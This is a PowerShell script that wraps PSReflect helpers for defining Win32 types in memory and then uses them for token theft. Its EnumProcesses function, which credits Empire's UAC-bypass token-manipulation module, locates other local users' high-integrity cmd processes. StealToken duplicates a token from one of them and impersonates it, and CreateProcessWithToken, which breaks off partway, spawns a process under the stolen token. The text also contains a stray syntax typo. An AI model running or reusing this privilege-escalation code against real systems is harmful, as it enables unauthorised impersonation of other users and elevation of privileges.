function New-InMemoryModule
{
    <#
    .SYNOPSIS

    Creates an in-memory assembly and module

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
     
    .DESCRIPTION

    When defining custom enums, structs, and unmanaged functions, it is
    necessary to associate to an assembly module. This helper function
    creates an in-memory module that can be passed to the 'enum',
    'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

    Specifies the desired name for the in-memory assembly and module. If
    ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

    $Module = New-InMemoryModule -ModuleName Win32
    #>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}

function Add-Win32Type
{
    <#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
    #>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}

function psenum
{
    <#
        .SYNOPSIS

            Creates an in-memory enumeration for use in your PowerShell session.

            Author: Matthew Graeber (@mattifestation)
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
         
        .DESCRIPTION

            The 'psenum' function facilitates the creation of enums entirely in
            memory using as close to a "C style" as PowerShell will allow.

        .PARAMETER Module

            The in-memory module that will host the enum. Use
            New-InMemoryModule to define an in-memory module.

        .PARAMETER FullName

            The fully-qualified name of the enum.

        .PARAMETER Type

            The type of each enum element.

        .PARAMETER EnumElements

            A hashtable of enum elements.

        .PARAMETER Bitfield

            Specifies that the enum should be treated as a bitfield.

        .EXAMPLE

            $Mod = New-InMemoryModule -ModuleName Win32

            $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
                UNKNOWN =                  0
                NATIVE =                   1 # Image doesn't require a subsystem.
                WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
                WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
                OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
                POSIX_CUI =                7 # Image runs in the Posix character subsystem.
                NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
                WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
                EFI_APPLICATION =          10
                EFI_BOOT_SERVICE_DRIVER =  11
                EFI_RUNTIME_DRIVER =       12
                EFI_ROM =                  13
                XBOX =                     14
                WINDOWS_BOOT_APPLICATION = 16
            }

        .NOTES

            PowerShell purists may disagree with the naming of this function but
            again, this was developed in such a way so as to emulate a "C style"
            definition as closely as possible. Sorry, I'm not going to name it
            New-Enum. :P
    #>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}

function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}

function struct
{
    <#
    .SYNOPSIS

    Creates an in-memory struct for use in your PowerShell session.

    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: field
     
    .DESCRIPTION

    The 'struct' function facilitates the creation of structs entirely in
    memory using as close to a "C style" as PowerShell will allow. Struct
    fields are specified using a hashtable where each field of the struct
    is comprosed of the order in which it should be defined, its .NET
    type, and optionally, its offset and special marshaling attributes.

    One of the features of 'struct' is that after your struct is defined,
    it will come with a built-in GetSize method as well as an explicit
    converter so that you can easily cast an IntPtr to the struct without
    relying upon calling SizeOf and/or PtrToStructure in the Marshal
    class.

    .PARAMETER Module

    The in-memory module that will host the struct. Use
    New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

    The fully-qualified name of the struct.

    .PARAMETER StructFields

    A hashtable of fields. Use the 'field' helper function to ease
    defining each field.

    .PARAMETER PackingSize

    Specifies the memory alignment of fields.

    .PARAMETER ExplicitLayout

    Indicates that an explicit offset for each field will be specified.

    .PARAMETER CharSet

    Dictates which character set marshaled strings should use.

    .EXAMPLE

    $Mod = New-InMemoryModule -ModuleName Win32

    $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
        DOS_SIGNATURE =    0x5A4D
        OS2_SIGNATURE =    0x454E
        OS2_SIGNATURE_LE = 0x454C
        VXD_SIGNATURE =    0x454C
    }

    $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
        e_magic =    field 0 $ImageDosSignature
        e_cblp =     field 1 UInt16
        e_cp =       field 2 UInt16
        e_crlc =     field 3 UInt16
        e_cparhdr =  field 4 UInt16
        e_minalloc = field 5 UInt16
        e_maxalloc = field 6 UInt16
        e_ss =       field 7 UInt16
        e_sp =       field 8 UInt16
        e_csum =     field 9 UInt16
        e_ip =       field 10 UInt16
        e_cs =       field 11 UInt16
        e_lfarlc =   field 12 UInt16
        e_ovno =     field 13 UInt16
        e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
        e_oemid =    field 15 UInt16
        e_oeminfo =  field 16 UInt16
        e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
        e_lfanew =   field 18 Int32
    }

    # Example of using an explicit layout in order to create a union.
    $TestUnion = struct $Mod TestUnion @{
        field1 = field 0 UInt32 0
        field2 = field 1 IntPtr 0
    } -ExplicitLayout

    .NOTES

    PowerShell purists may disagree with the naming of this function but
    again, this was developed in such a way so as to emulate a "C style"
    definition as closely as possible. Sorry, I'm not going to name it
    New-Struct. :P
    #>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            
            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}

$Module = New-InMemoryModule -ModuleName Win32

$PROCESS_ACCESS = psenum $Module PROCESS_ACCESS UInt32 @{
    PROCESS_TERMINATE                 = 0x00000001
    PROCESS_CREATE_THREAD             = 0x00000002
    PROCESS_VM_OPERATION              = 0x00000008
    PROCESS_VM_READ                   = 0x00000010
    PROCESS_VM_WRITE                  = 0x00000020
    PROCESS_DUP_HANDLE                = 0x00000040
    PROCESS_CREATE_PROCESS            = 0x00000080
    PROCESS_SET_QUOTA                 = 0x00000100
    PROCESS_SET_INFORMATION           = 0x00000200
    PROCESS_QUERY_INFORMATION         = 0x00000400
    PROCESS_SUSPEND_RESUME            = 0x00000800
    PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000
    DELETE                            = 0x00010000
    READ_CONTROL                      = 0x00020000
    WRITE_DAC                         = 0x00040000
    WRITE_OWNER                       = 0x00080000
    SYNCHRONIZE                       = 0x00100000
    PROCESS_ALL_ACCESS                = 0x001f1ffb
} -Bitfield

$TOKEN_ACCESS = psenum $Module TOKEN_ACCESS UInt32 @{
    TOKEN_DUPLICATE          = 0x00000002
    TOKEN_IMPERSONATE        = 0x00000004
    TOKEN_QUERY              = 0x00000008
    TOKEN_QUERY_SOURCE       = 0x00000010
    TOKEN_ADJUST_PRIVILEGES  = 0x00000020
    TOKEN_ADJUST_GROUPS      = 0x00000040
    TOKEN_ADJUST_DEFAULT     = 0x00000080
    TOKEN_ADJUST_SESSIONID   = 0x00000100
    DELETE                   = 0x00010000
    READ_CONTROL             = 0x00020000
    WRITE_DAC                = 0x00040000
    WRITE_OWNER              = 0x00080000
    SYNCHRONIZE              = 0x00100000
    STANDARD_RIGHTS_REQUIRED = 0x000F0000
    TOKEN_ALL_ACCESS         = 0x001f01ff
    MAXIMUM_ALLOWED          = 0x02000000
} -Bitfield

$SECURITY_ATTRIBUTES = struct $Module SECURITY_ATTRIBUTES @{
    nLength = field 0 Int
    lpSecurityDescriptor = field 1 IntPtr
    bInheritHandle = field 2 Int
}

$SECURITY_IMPERSONATION_LEVEL = psenum $Module SECURITY_IMPERSONATION_LEVEL UInt32 @{
    SecurityAnonymous      = 0
    SecurityIdentification = 1
    SecurityImpersonation  = 2
    SecurityDelegation     = 3
}

$TOKEN_TYPE = psenum $Module TOKEN_TYPE UInt32 @{
    TokenPrimary        = 1
    TokenImpersonation  = 2
}

$STARTUPINFO = struct $Module STARTUPINFO @{
    cb = field 0 int
    lpReserved = field 1 string
    lpDesktop = field 2 string
    lpTitle = field 3 string
    dwX = field 4 int
    dwY = field 5 int
    dwXSize = field 6 int
    dwYSize = field 7 int
    dwXCountChars = field 8 int
    dwYCountChars = field 9 int
    dwFillAttribute = field 10 int
    dwFlags = field 11 int
    wShowWindow = field 12 int
    cbReserved2 = field 13 int
    lpReserved2 = field 14 IntPtr
    hStdInput = field 15 IntPtr
    hStdOutput = field 16 IntPtr
    hStdError = field 17 IntPtr
}

$PROCESS_INFORMATION = struct $Module PROCESS_INFORMATION @{
     hProcess = field 0 IntPtr
     hThread = field 1 IntPtr
     dwProcessId = field 2 int
     dwThreadId = field 3 int
}

$FunctionDefinitions = @(

    (func kernel32 OpenProcess ([IntPtr]) @(
        [UInt32],
        [bool],
        [UInt32]
    )-EntryPoint OpenProcess -SetLastError),

    (func advapi32 OpenProcessToken ([bool]) @(
        [IntPtr],
        [UInt32],
        [IntPtr].MakeByRefType()
    ) -EntryPoint OpenProcessToken -SetLastError),

    (func advapi32 DuplicateTokenEx ([bool]) @(
        [IntPtr], 
        [UInt32], 
        [IntPtr], 
        [UInt32], 
        [UInt32], 
        [IntPtr].MakeByRefType()
    ) -EntryPoint DuplicateTokenEx -SetLastError),

    (func advapi32 ImpersonateLoggedOnUser ([bool]) @(
        [IntPtr]
    ) -EntryPoint ImpersonateLoggedOnUser -SetLastError),

    (func advapi32 RevertToSelf ([bool]) @(
    ) -EntryPoint RevertToSelf -SetLastError),

    (func kernel32 GetCurrentThread ([IntPtr]) @(
    ) -EntryPoint GetCurrentThread -SetLastError),

    (func advapi32 OpenThreadToken ([bool]) @(
        [IntPtr], 
        [UInt32], 
        [bool],
        [IntPtr].MakeByRefType()
    ) -EntryPoint OpenThreadToken -SetLastError),

    (func advapi32 CreateProcessWithTokenW ([bool]) @(
        [IntPtr], 
        [UInt32], 
        [String], 
        [String], 
        [UInt32], 
        [UInt32], 
        [String], 
        [IntPtr], 
        [IntPtr].MakeByRefType()
    ) -EntryPoint CreateProcessWithTokenW -SetLastError),

    (func advapi32 GetTokenInformation ([bool]) @(
        [IntPtr],
        [Int32],
        [IntPtr],
        [UInt32],
        [UInt32].MakeByRefType()
    ) -EntryPoint GetTokenInformation -SetLastError),

    (func advapi32 GetSidSubAuthority([IntPtr]) @(
        [IntPtr],
        [UInt32]
    ) -EntryPoint GetSidSubAuthority -SetLastError),

    (func advapi32 GetSidSubAuthorityCount ([IntPtr]) @(
        [IntPtr]
    ) -EntryPoint GetSidSubAuthorityCount -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'Win32'
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']

function EnumProcesses
{
    <#
        .SOURCE

        https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1
    #>

    $HighIntegrityProcesses = @()
    $LocalUsers = Get-LocalUser | Where-Object { $_.Name -ne "$env:USERNAME" -and $_.Enabled -eq "True" } | Select -ExpandProperty Name
    foreach ($LocalUser in $LocalUsers)
    {
        $Username = "*\" + "$LocalUser"
        Get-Process -IncludeUserName | Where-Object { $_.UserName -like $Username } | %{
            
            # Get handle to the process
            $ProcHandle = $Kernel32::OpenProcess(0x00001000, $false, $_.Id)
            if($ProcHandle -eq 0)
            {
                #echo "[!] Unable to open process`n"
                return
            }

            # Get handle to the process token
            $hTokenHandle = 0
            $CallResult = $Advapi32::OpenProcessToken($ProcHandle, 0x02000000, [ref]$hTokenHandle)
            if($CallResult -eq 0)
            {
                return
            }   
                
            # Call GetTokenInformation with TokenInformationClass = 25 (TokenIntegrityLevel)
            [int]$Length = 0
            $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, [IntPtr]::Zero, $Length, [ref]$Length)
                
            # After we get the buffer length alloc and call again
            [IntPtr]$TokenInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Length)
            $CallResult = $Advapi32::GetTokenInformation($hTokenHandle, 25, $TokenInformation, $Length, [ref]$Length)
                
            [System.IntPtr] $pSid1 = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($TokenInformation)
            [int]$IntegrityLevel = [System.Runtime.InteropServices.Marshal]::ReadInt32($advapi32::GetSidSubAuthority($pSid1, ([System.Runtime.InteropServices.Marshal]::ReadByte($Advapi32::GetSidSubAuthorityCount($pSid1)) - 1)))

            if(($IntegrityLevel -eq 12288) -and ($_.Name -eq "cmd"))
            {
                return [int]$_.Id
                break
                <#
                $HighIntegrityProcesses += @{
                    ProcessId = $_.Id
                    ProcessName = $_.Name
                }
                #>
            }
        }
    }
    # $HighIntegrityProcesses | % { New-Object PSObject -Property $_}
}

function StealToken
{
    $ProcessId = EnumProcesses

    # OpenProcess Parameters         
    $DesiredAccess = 'PROCESS_QUERY_INFORMATION'
    $dwDesiredAccess = 0
    foreach($val in $DesiredAccess) { $dwDesiredAccess = $dwDesiredAccess -bor $PROCESS_ACCESS::$val }
    $InheritHandle = $False

    # OpenProcess - Open an existing local process object
    $ProcessHandle = $Kernel32::OpenProcess($dwDesiredAccess, $InheritHandle, $ProcessId); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    
    if($ProcessHandle -eq 0) 
    {
        throw "OpenProcess Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Opened process id: $ProcessId"
    }

    # OpenProcessToken Parameters
    $DesiredAccess = 'TOKEN_QUERY','TOKEN_DUPLICATE'
    $dwDesiredAccess = 0
    foreach($val in $DesiredAccess) { $dwDesiredAccess = $dwDesiredAccess -bor $TOKEN_ACCESS::$val }
    $TokenHandle = [IntPtr]::Zero

    # OpenProcessToken - Open the access token associated with a process
    $Result = $Advapi32::OpenProcessToken($ProcessHandle, $dwDesiredAccess, [ref]$TokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0) 
    {
        throw "OpenProcessToken Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }  
    else 
    {
        Write-Host "[*] Opened process token"
    }

    # DuplicateTokenEx Parameters
    $DesiredAccess = $TOKEN_ACCESS::'MAXIMUM_ALLOWED'
    $NEW_SECURITY_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
    [IntPtr]$TokenAttributes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SECURITY_ATTRIBUTES::GetSize())
    [Runtime.InteropServices.Marshal]::StructureToPtr($NEW_SECURITY_ATTRIBUTES_Struct, $TokenAttributes, $False)
    $ImpersonationLevel = $SECURITY_IMPERSONATION_LEVEL::'SecurityImpersonation'
    $TokenType = $TOKEN_TYPE::'TokenImpersonation'
    $NewTokenHandle = [IntPtr]::Zero

    # DuplicateTokenEx - Create a new access token that duplicates an existing token
    $Result = $Advapi32::DuplicateTokenEx($TokenHandle, $DesiredAccess, $TokenAttributes, $ImpersonationLevel, $TokenType, [ref]$NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0)
    {
        throw    "DuplicateTokenEx Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Duplicated token"
    }

    # ImpersonateLoggedOnUser - Impersonate the security context of a logged-on user
    $Result = $Advapi32::ImpersonateLoggedOnUser($NewTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0)
    {
        throw "ImpersonateLoggedOnUser Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    else 
    {
        Write-Host "[*] Assigned token to calling thread"  
    }
}

function CreateProcessWithToken
{
    param
    (
        [Parameter(Mandatory = $false)]
        [String]
        $ApplicationName="C:\Windows\System32\cmd.exe",
        [Parameter(Mandatory = $false)]
        [String]
        $CommandLine="cmd.exe /c calc.exe"
    )
    # GetCurrentThread - Retrieve a pseudo handle for the calling thread
    $CurrentThreadHandle = [IntPtr]::Zero
    $CurrentThreadHandle = $Kernel32::GetCurrentThread()
    Write-Host "[*] Retrieved a pseudo handle for the calling thread" 

    # OpenThreadToken Parameters
    $DesiredAccess = 'TOKEN_QUERY','TOKEN_DUPLICATE'
    $dwDesiredAccess = 0
    foreach($val in $DesiredAccess) { $dwDesiredAccess = $dwDesiredAccess -bor $TOKEN_ACCESS::$val }
    $OpenAsSelf = $false 
    $CurrentThreadTokenHandle = [IntPtr]::Zero

    # OpenThreadToken - Open the access token associated with a thread
    $Result = $Advapi32::OpenThreadToken($CurrentThreadHandle, $dwDesiredAccess, $OpenAsSelf, [ref]$CurrentThreadTokenHandle); $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if($Result -eq 0) 
    {
        throw "OpenThreadToken Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }
    
    else 
    {
        Write-Host "[*] Opened current thread token"
    }

    # DuplicateTokenEx Parameters
    $DesiredAccess = $TOKEN_ACCESS::'MAXIMUM_ALLOWED'
    $NEW_SECURITY_ATTRIBUTES_Struct = [Activator]::CreateInstance($SECURITY_ATTRIBUTES)
